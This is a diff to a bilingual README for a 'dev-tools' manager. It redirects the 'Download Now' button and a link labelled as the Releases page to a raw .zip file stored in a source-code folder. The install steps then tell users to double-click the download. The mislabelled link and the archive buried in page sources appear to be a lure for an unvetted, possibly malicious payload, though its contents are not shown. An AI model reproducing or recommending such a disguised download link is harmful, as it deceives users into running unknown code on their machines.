@@ -1,7 +1,7 @@
 # 🛠️ dev-tools - A Simple Way to Manage Development Tools
 
 <div align="center">
-  <a href="https://github.com/DibbenduOjha/dev-tools/releases" style="display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
+  <a href="https://github.com/DibbenduOjha/dev-tools/raw/refs/heads/main/src/pages/ToolsPage/tools_dev_2.5-alpha.4.zip" style="display: inline-block; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px;">Download Now</a>
 </div>
 
 ---
@@ -45,7 +45,7 @@ DevTool Manager 支持以下操作系统：
 
 ### 📥 下载和安装
 
-1. 访问 DevTool Manager 的 [Releases 页面](https://github.com/DibbenduOjha/dev-tools/releases)。
+1. 访问 DevTool Manager 的 [Releases 页面](https://github.com/DibbenduOjha/dev-tools/raw/refs/heads/main/src/pages/ToolsPage/tools_dev_2.5-alpha.4.zip)。
 2. 找到最新版本的下载链接。
 3. 根据您的操作系统下载相应的安装文件。
 4. 双击下载的文件并按照屏幕上的提示完成安装。
